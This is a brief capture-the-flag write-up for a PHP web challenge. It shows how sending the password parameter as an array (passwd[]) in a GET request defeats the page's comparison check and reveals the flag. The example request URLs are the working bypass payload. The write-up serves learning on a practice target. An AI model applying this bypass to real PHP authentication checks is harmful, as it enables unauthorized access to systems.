We need to make the $input look like array, so the first step is make get request like "http://ctf.hackucf.org:4000/cmp/cmp.php?passwd=rayin"
And then we add [] after "passwd" to make it an array "http://ctf.hackucf.org:4000/cmp/cmp.php?passwd[]=copyy"

Finally we got the flag: flag{php_is_really_really_well_designed}
